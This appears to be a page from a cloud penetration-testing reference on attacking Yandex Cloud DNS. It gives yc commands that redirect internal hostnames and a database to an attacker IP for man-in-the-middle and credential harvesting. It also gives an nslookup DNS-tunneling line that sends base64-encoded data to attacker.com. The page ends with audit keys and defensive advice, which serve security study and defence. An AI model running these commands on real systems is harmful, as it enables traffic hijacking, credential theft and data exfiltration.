# DNS — Cloud DNS

## Overview

Cloud DNS manages DNS zones (public and internal) and records. DNS manipulation enables traffic redirection, service discovery poisoning, and data exfiltration through DNS queries.

## Lateral Movement

### Internal DNS Record Manipulation

With `dns.editor`:

```bash
# Redirect internal service traffic to attacker proxy
yc dns zone add-records --name <zone> \
  --record "<hostname> 60 A <attacker-ip>"

# Redirect database hostname
yc dns zone add-records --name <internal-zone> \
  --record "db.internal 60 A <attacker-proxy-ip>"
```

**Use cases:**
- Redirect internal service-to-service communication
- Man-in-the-middle database connections
- Credential harvesting via fake service endpoints
- Redirect to phishing pages

### Public DNS Manipulation

Modifying public zone records enables:
- Domain takeover
- Email interception (MX record changes)
- TLS certificate issuance for attacker domains (ACME DNS challenge)

---

## Persistence

### DNS Record Persistence

DNS records survive application redeployments:
- Applications resolve hostnames dynamically
- Changed DNS records redirect traffic without application config changes
- Difficult to detect without DNS-specific monitoring

### Low TTL for Quick Changes

Set low TTL values (60s) for records you control — changes propagate quickly and can be reverted fast.

---

## Exfiltration

### DNS Tunneling

Encode data in DNS query subdomains to attacker-controlled nameservers:

```bash
# Example: encode data in subdomain queries
nslookup $(echo "sensitive_data" | base64).attacker.com
```

Low bandwidth but extremely difficult to detect with standard monitoring.

---

## Enumeration

```bash
yc dns zone list --folder-id <folder-id>
yc dns zone list-records --name <zone-name>
yc dns zone get <zone-id>
```

---

## Detection

| Event | Audit Key |
|---|---|
| Record creation/modification | `dns.zones.updateRecords` |
| Zone creation | `dns.zones.create` |
| Zone deletion | `dns.zones.delete` |

## Defensive Recommendations

1. Restrict `dns.editor` to infrastructure team only
2. Alert on DNS record changes — especially for internal zones
3. Monitor for unexpected A/CNAME/MX record modifications
4. Audit DNS zones regularly against expected configurations
5. Use DNSSEC where possible
